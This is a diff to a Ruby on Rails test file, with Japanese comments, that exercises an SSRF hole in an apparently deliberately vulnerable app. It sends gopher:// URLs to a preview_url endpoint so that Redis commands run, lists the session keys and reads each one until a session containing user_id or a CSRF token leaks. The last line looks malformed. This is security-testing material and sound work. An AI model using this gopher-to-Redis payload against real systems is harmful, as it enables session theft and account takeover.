@@ -92,24 +92,30 @@ class SsrfTest < ActiveSupport::TestCase
       headers: { "Cookie" => cookie }
     )
 
-    # Redis の KEYS レスポンスから実際のキーを抽出する (例: _session_id:2::...)
     keys_body = JSON.parse(res_keys.body)["body"]
-    actual_key = keys_body.match(/(_session_id:[^\\\r\n]+)/)&.captures&.first
-    assert actual_key.present?, "Redis 内にセッションキーが存在するはず"
+    # Redis のレスポンスからセッションキーをすべて抽出
+    all_session_keys = keys_body.scan(/(_session_id:[^\\\r\n\s]+)/).flatten
+    assert all_session_keys.any?, "Redis 内にセッションキーが存在するはず"
 
-    # 3) 特定したキーを GET で取得
-    encoded_key = ERB::Util.url_encode(actual_key)
-    get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
-    res_get = @vuln_server.post(
-      "/tasks/#{task_id}/preview_url",
-      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
-      headers: { "Cookie" => cookie }
-    )
+    # 3) 各キーを GET で取得し、ログイン済みセッションを探す
+    found_leaked_data = false
+    all_session_keys.each do |key|
+      encoded_key = ERB::Util.url_encode(key)
+      get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
+      res_get = @vuln_server.post(
+        "/tasks/#{task_id}/preview_url",
+        body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
+        headers: { "Cookie" => cookie }
+      )
 
-    # レスポンスに Marshall 形式のセッションデータが含まれることを確認
-    fetched_body = JSON.parse(res_get.body)["body"]
-    assert fetched_body.present?, "セッションデータがリークするはず"
-    assert_match /user_id|_csrf_token/i, fetched_body, "リークしたデータにセッション情報が含まれるはず"
+      fetched_body = JSON.parse(res_get.body)["body"]
+      # Marshall 形式のデータ内に user_id か _csrf_token が含まれているか確認
+      if fetched_body =~ /user_id|_csrf_token/i
+        found_leaked_data = true
+        break
+      end
     end
-    end
+
+    assert found_leaked_data, "リークしたデータにセッション情報 (user_id 等) が含まれるはず"
+    end    end
 
